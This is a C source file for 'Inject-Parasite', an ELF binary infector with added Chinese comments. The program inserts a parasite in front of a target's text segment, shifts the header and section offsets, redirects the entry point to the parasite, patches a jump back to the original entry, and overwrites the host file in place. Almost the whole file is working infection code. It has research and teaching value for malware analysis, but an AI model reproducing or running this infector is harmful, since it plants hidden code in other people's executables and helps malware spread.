/*
 * Inject-Parasite: ELF Binary infector (C) 2008  Ryan O'Neill <ryan@bitlackeys.com>
 * This is an ELF binary infector that inserts the parasite in front of the text segment
 * and essentially extends the text segment backwards. This is a good method because the entry
 * point does not need to be modified, although a good binary integrity checker will notice
 * that the text/base address is slightly unusual.
 *
 */


/*
该注入算法由于是将text段从前面位置扩展0x1000，因此所有的表字段中，绝对加载地址-0x1000，偏移均+0x1000
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h> 
#include <fcntl.h>

#include <elf.h>
#include <sys/mman.h>

#define PAGE_SIZE 4096
#define TMP "tmp.bin"

extern int return_entry_start;
struct stat st;
char *host;

unsigned long entry_point;
int ehdr_size; 

void mirror_binary_with_parasite(unsigned int, unsigned char *, char *);

int main(int argc, char **argv)
{
	unsigned char *mem; 
	
	unsigned char *tp;
	int fd, i, c;
	char text_found;
	mode_t mode;
	
	extern char parasite[];
	/* bytes of parasite */
        unsigned int parasite_size;
	unsigned long int leap_offset;
	unsigned long parasite_vaddr;

 	Elf64_Shdr *s_hdr;
        Elf64_Ehdr *e_hdr;
        Elf64_Phdr *p_hdr;
	
	usage:
	if (argc < 2)
	{
		printf("Usage: %s <elf-host>\n",argv[0]); 
		exit(-1);
	}
 	 
	host = argv[1];
	//舍弃外部参数输入，直接sizeof计算, 不可strlen,会有\x00坏字符
	parasite_size = return_entry_start + 6;
	printf("Length of parasite is %d bytes\n", parasite_size);
	
	if ((fd = open(argv[1], O_RDONLY)) == -1)
	{
		perror("open");
		exit(-1);
	}
	
	if (fstat(fd, &st) < 0)
        {
               perror("stat");
               exit(-1);
        } 
	
	mem = mmap(NULL, st.st_size,  PROT_READ | PROT_WRITE, MAP_PRIVATE , fd, 0);
	if (mem == MAP_FAILED)
	{
	       perror("mmap");
	       exit(-1);
 	}
	
	e_hdr = (Elf64_Ehdr *)mem;
	//这里条件应该为||
 	if (e_hdr->e_ident[0] != 0x7f || strncmp(&e_hdr->e_ident[1], "ELF", 3))
        {
                printf("%s it not an elf file\n", argv[1]);
                exit(-1);
        } 
	
       printf("Parasite size: %d\n", parasite_size);
       
       text_found = 0;
       unsigned int after_insertion_offset;
       ehdr_size = sizeof(*e_hdr);
       entry_point = e_hdr->e_entry; 
		//由于程序头表中，text段的p_offset为0，其他的所有的类型表都比它大，因此就是导致所有的表都加了0x1000
		//0 和 1为手动加， 2一般为text，text_found置为1之后，后面的的也会执行p_hdr->p_offset += PAGE_SIZE;
       p_hdr = (Elf64_Phdr *)(mem + e_hdr->e_phoff);
       p_hdr[0].p_offset += PAGE_SIZE;
       p_hdr[1].p_offset += PAGE_SIZE;

       for (i = e_hdr->e_phnum; i-- > 0; p_hdr++) 
       {	 
       	   if (text_found)
	 	  p_hdr->p_offset += PAGE_SIZE;

           if(p_hdr->p_type == PT_LOAD)
	        if (p_hdr->p_flags == (PF_R | PF_X))
	        {
			  p_hdr->p_vaddr -= PAGE_SIZE;
			  e_hdr->e_entry = p_hdr->p_vaddr;
			  p_hdr->p_paddr -= PAGE_SIZE;
			  p_hdr->p_filesz += PAGE_SIZE;
			  p_hdr->p_memsz += PAGE_SIZE;
			  text_found = 1;
	        }
        }  
	e_hdr->e_entry += sizeof(*e_hdr);
	//因为是逆向拓展0x1000，因此所有的偏移相对于原来的文件头相当于off-0变成off-(-0x1000)=off+0x1000=off+PAGE_SIZE
	 s_hdr = (Elf64_Shdr *)(mem + e_hdr->e_shoff);
	 for (i = e_hdr->e_shnum; i-- > 0; s_hdr++)
		s_hdr->sh_offset += PAGE_SIZE;
	
	 e_hdr->e_shoff += PAGE_SIZE;
	 e_hdr->e_phoff += PAGE_SIZE;
 	 
	 printf("new entry: %lx\n", e_hdr->e_entry);
	 mirror_binary_with_parasite(parasite_size, mem, parasite);

 	 done:
 	 munmap(mem, st.st_size);
 	 close(fd);
 	  	  
 }

void mirror_binary_with_parasite(unsigned int psize, unsigned char *mem, char *parasite)
{
	
	int ofd;
	unsigned int c;
	int i, t = 0;
	
	/* eot is: 
	 * end_of_text = e_hdr->e_phoff + nc * e_hdr->e_phentsize;
	 * end_of_text += p_hdr->p_filesz;
	 */ 

	printf("Mirroring host binary with parasite %d bytes\n",psize);

	if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode)) == -1)
	{
		perror("tmp binary: open");
		exit(-1);
	}
	
	if ((c = write(ofd, mem, ehdr_size)) != ehdr_size)
	{
		printf("failed writing ehdr\n");
		exit(-1);
	}
	
	printf("Patching parasite to jmp to %lx\n", entry_point);
	
	*(unsigned int *)&parasite[return_entry_start] = entry_point;
	

	if ((c = write(ofd, parasite, psize)) != psize)
	{
		perror("writing parasite failed");
		exit(-1);
	}
	
	if ((c = lseek(ofd, ehdr_size + PAGE_SIZE, SEEK_SET)) != ehdr_size + PAGE_SIZE)
	{
		printf("lseek only wrote %d bytes\n", c);
		exit(-1);
	}

	mem += ehdr_size;
	
	if ((c = write(ofd, mem, st.st_size-ehdr_size)) != st.st_size-ehdr_size)
	{
		printf("Failed writing binary, wrote %d bytes\n", c);
		exit(-1);
	}
	
	rename(TMP, host);
	close(ofd);
	
}


